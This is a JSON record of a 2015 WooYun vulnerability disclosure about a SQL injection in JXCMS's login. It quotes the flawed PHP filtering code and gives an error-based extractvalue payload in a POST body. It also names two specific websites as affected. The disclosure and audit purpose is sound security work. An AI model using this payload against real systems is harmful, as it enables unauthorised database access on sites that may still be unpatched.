{"id": 34984, "wybug_id": "wooyun-2015-0105027", "wybug_title": "精讯CMS SQL注入（通杀）", "wybug_corp": "jxcms.com", "wybug_author": "xiaoL", "wybug_date": "2015-04-01 17:46", "wybug_open_date": "2015-07-05 17:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-06：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向公众公开  简要描述： 底层模型解析出错，导致大面积注入。这是真的注入，真的能注出数据的。无视新版添加的webscan.class.php 详细说明：  找注入，上来就看sql语句是怎么处理的。jxcms的model调用数据库操作无论是->where->find都会调用/jxcms/lib/core/db.class.php文件中的checkOneWhere函数进行组装与过滤。\nprivate function checkOneWhere($str) {\t\t$tmp = preg_replace('/([\"|\\']).*?\\\\1/s', '', $str);\t\t$tmp = strtoupper($tmp);\t\tif (strstr($tmp, ' BETWEEN ')) $tmp = preg_replace('/ AND /', '', $tmp, 1);\t\t// 不是单个条件直接返回\t\tif (strstr($tmp, ' AND ') || strstr($tmp, ' OR ') || strstr($tmp, ' XOR ')) return $str;\t\t//主要是这里，发现AND OR XOR就会直接返回，而不会进过后面的parseValue()函数\t\t// 规范化IN\t\t$tmp = strtok($str, '\"\\'');\t\tif (stristr($tmp, ' IN(')) {\t\t\t$tmp = preg_replace('/ IN\\(/i', ' IN (', $tmp, 1);\t\t\t$str = preg_replace('/ IN\\(/i', ' IN (', $str, 1);\t\t}\t\tforeach(array('!=', '>=', '<=', '=', '>', '<', ' NOT IN ', ' IN ', ' NOT LIKE ', ' LIKE ', ' BETWEEN ') as $comp) {\t\t\tif (stristr($tmp, $comp)) {\t\t\t\t$t = explode($comp, $str, 2);\t\t\t\t$field = $this -> addSpecialChar($t[0]);\t\t\t\t$value = trim($t[1]);\t\t\t\tif (is_string($value)) {\t\t\t\t\t$first = substr($value, 0, 1);\t\t\t\t\tif ($first == '\"' || $first == '\\'') {\t\t\t\t\t\t$value = substr($value, 1, -1);\t\t\t\t\t\tif (!stristr($comp, ' IN ')) $value = $this -> parseValue($value);\t\t\t\t\t} else {\t\t\t\t\t\tif (!(stristr($comp, ' IN ') || (strpos($field, '.', 1) && strpos($value, '.', 1)))) {\t\t\t\t\t\t\t$value = $this -> parseValue($value);\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t\treturn \"$field $comp $value\";\t\t\t}\t\t}\t\treturn $str;\t}\n这样随便找一个可控的find()就行了。另一个问题：webscan.class.php貌似是最新版新加的，不去绕过了，直接找无视的方式。可以找到jxcms/common.php中存在：\nimport('Lib/Core/App', 'jxcms');import('Lib/Core/Base', 'jxcms');if (C('WEBSCAN', 1) && !defined('IN_ADMIN')) Webscan :: run();只要是后台操作就不开启\n那就去admin.php文件调用，此处当然不会是后台注入。就是后台登录位置即可。\npublic function login() {\t\tif ($this -> isSubmit) {\t\t\tif (C('captcha_admin_login', 0, 'member')) {\t\t\t\t$captcha = new Captcha();\t\t\t\t$captcha -> check(trim($_POST['captcha'])) or $this -> showMsg(L('CAPTCHA_ERROR'));\t\t\t}\t\t\t$memberObj = M('member');\t\t\t$username = trim($_POST['username']);\t\t//未过滤\t\t\t$password = md5(trim($_POST['password']));\t\t\t$field = array('userid', 'username', 'password', 'email', 'lastdate', 'groupid');\t\t\t$where = array('username' => $username, 'groupid' => 1);\t\t\t$r = $memberObj -> field($field) -> where($where) -> find(); //where直接带入\t\t\tif ($r) {\t\t\t\tif ($r['password'] == $password) {\t\t\t\t\t// 后台登陆信息\t\t\t\t\t$loginInfo = array('userid' => $r['userid'], 'username' => $r['username'], 'email' => $r['email'], 'lastdate' => $r['lastdate'], 'groupid' => 1, 'role' => $memberObj -> getRole($r['userid']), 'hash' => Func :: getHash($username . $password));\t\t\t\t\t// 前台登陆信息\t\t\t\t\t$userInfo = array('userid' => $r['userid'], 'username' => $r['username'], 'email' => $r['email'], 'lastdate' => $r['lastdate'], 'groupid' => 1, 'password' => $password);\t\t\t\t\tM('member') -> setLogin($userInfo);\t\t\t\t\t$_SESSION[C('DB_PREFIX', 1) . 'loginInfo'] = serialize($loginInfo);\t\t\t\t\t$this -> showMsg(L('LOGIN_SUCCESS'), '?a=defaults');\t\t\t\t} else $this -> showMsg(L('PASSWORD_ERROR'), '?a=login');\t\t\t} else $this -> showMsg(L('USERNAME_IS_NOT_EXIST'), '?a=login');\t\t}\t\t$this -> display('login');\t}\n   漏洞证明：  后台登录提交数据包：submit=1&username='testtest' AND extractvalue(1, concat(0x5c,(select user())));-- 1&password=testtest&captcha=ckxn&subimg.x=32&subimg.y=24这里是不过滤的，所以里面的语句是任意的。这里只是举例，注意验证码。本地最新版：\n\nhttp://test.tzks.cn/\n\nwww.gsdedu.com\n\n   修复方案：  都过滤   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-05 17:49 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-02 14:19 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  赞    \n     2015-04-13 11:23 |    \t\twiluilu \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 涅槃就是死~)\t\t \n  +1    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}